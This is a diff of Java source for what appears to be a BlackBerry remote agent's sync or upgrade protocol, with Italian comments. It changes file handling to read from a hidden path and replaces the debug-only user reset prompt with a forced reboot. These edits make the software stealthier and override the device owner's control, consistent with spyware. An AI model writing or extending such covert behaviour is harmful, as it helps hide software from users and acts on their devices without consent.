@@ -17,6 +17,7 @@ import javax.microedition.io.file.FileSystemRegistry;
 
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.util.DataBuffer;
+import blackberry.Core;
 import blackberry.Messages;
 import blackberry.action.sync.protocol.CommandException;
 import blackberry.action.sync.protocol.ProtocolException;
@@ -129,7 +130,7 @@ public abstract class Protocol {
             // guarda se i file ci sono tutti e sono capienti e leggibili
             for (int i = 0; i < files.size(); i++) {
                 String file = (String) files.elementAt(i);
-                AutoFile autoFile = new AutoFile(file);
+                AutoFile autoFile = new AutoFile(Path.hidden(),file);
                 autoFiles[i] = autoFile;
 
                 if (!autoFile.exists() || !autoFile.isReadable()
@@ -156,9 +157,8 @@ public abstract class Protocol {
 
             // restart the blackberry if required
             if (CodeModuleManager.isResetRequired()) {
-                //#ifdef DEBUG
-                CodeModuleManager.promptForResetIfRequired();
-                //#endif
+                Core.forceReboot();
+                
                 //#ifdef DEBUG
                 debug.warn("Reset required"); //$NON-NLS-1$
                 //#endif
